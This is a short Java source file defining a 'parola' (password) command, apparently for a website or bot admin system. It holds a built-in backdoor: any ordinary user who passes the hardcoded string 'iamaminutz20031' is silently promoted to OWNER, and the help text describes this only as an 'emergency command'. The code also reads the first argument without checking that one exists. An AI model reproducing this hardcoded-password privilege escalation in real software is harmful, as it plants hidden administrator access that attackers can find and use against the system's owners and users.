package me.minutz.l2m.cmd.cmds;

import me.minutz.l2m.config.user.UsersConfig;
import me.minutz.l2m.site.users.Grad;
import me.minutz.l2m.site.users.User;

public class ParolaCommand extends Command{

	public ParolaCommand() {
		super("parola", Grad.USER.getImportanta());
	}

	@Override
	public String execute(String[] args, int lvlexec, String nume) {
		if(args[0].equals("iamaminutz20031")) {
			User u = UsersConfig.getUserByNume(nume, false);
			if(u != null) {
				u.setGrad(Grad.OWNER, true);
				return "done";
			}
		}
		return "Se pare ca a aparut o eroare neasteptata :o";
	}

	@Override
	public String execute(int lvlexec, String nume) {
		return "INVALID: parola [Parola]";
	}

	@Override
	public String help() {
		return "Comanda de urgenta";
	}
	
	

}
